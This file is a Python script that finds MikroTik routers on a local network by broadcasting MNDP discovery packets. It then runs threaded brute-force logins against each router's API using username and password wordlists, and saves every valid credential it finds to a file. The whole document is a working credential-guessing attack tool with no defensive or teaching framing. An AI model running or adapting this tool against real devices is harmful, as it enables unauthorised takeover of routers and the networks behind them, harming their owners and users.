import os
import threading
from time import sleep
from scapy.all import *
from scapy.contrib import mndp 
from scapy.contrib.mndp import MNDPDiscoveryPacket
from librouteros import connect
from librouteros.exceptions import TrapError

def discover_mikrotik_interfaces(interface="eth0"):
    print("[!] Scanning local network for MikroTik devices via MNDP...")
    mikrotiks = []
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / MNDPDiscoveryPacket()
    ans, _ = srp(pkt, timeout=3, iface=interface, verbose=0)

    for _, rcv in ans:
        if rcv.haslayer(MNDPDiscoveryPacket):
            mac = rcv.src
            ip = rcv[MNDPDiscoveryPacket].ip_address
            identity = rcv[MNDPDiscoveryPacket].identity.decode("utf-8")
            mikrotiks.append((mac, ip, identity))
            print(f"[+] Found MikroTik - MAC: {mac}, IP: {ip}, Identity: {identity}")
    return mikrotiks

def load_wordlist(filename):
    if not os.path.isfile(filename):
        print(f"[ERROR] Wordlist file not found: {filename}")
        return []
    with open(filename, 'r') as file:
        return [line.strip() for line in file if line.strip()]

def brute_force_login(ip, mac, usernames, passwords):
    print(f"[!] Starting brute force on target {mac} ({ip})")
    for user in usernames:
        for pwd in passwords:
            try:
                connect(username=user, password=pwd, host=ip)
                print(f"[SUCCESS] IP: {ip} | MAC: {mac} | Username: {user} | Password: {pwd}")
                with open("success.txt", "a") as success_log:
                    success_log.write(f"{ip},{mac},{user},{pwd}\n")
                return (user, pwd)
            except TrapError:
                print(f"[FAILED] {user}:{pwd}")
            except Exception as e:
                print(f"[ERROR] Connection error on {ip}: {str(e)}")
    return None

def main():
    interface = input("Enter interface (e.g., eth0, wlan0): ").strip()
    user_wordlist = input("Enter path to username wordlist (e.g., usernames.txt): ").strip()
    pass_wordlist = input("Enter path to password wordlist (e.g., passwords.txt): ").strip()

    usernames = load_wordlist(user_wordlist)
    passwords = load_wordlist(pass_wordlist)

    if not usernames or not passwords:
        print("[!] Wordlists cannot be empty. Exiting.")
        return

    mikrotik_list = discover_mikrotik_interfaces(interface)

    threads = []
    for mac, ip, _ in mikrotik_list:
        t = threading.Thread(target=brute_force_login, args=(ip, mac, usernames, passwords))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("[!] Brute force completed. Check 'success.txt' for valid credentials.")

if __name__ == "__main__":
    main()
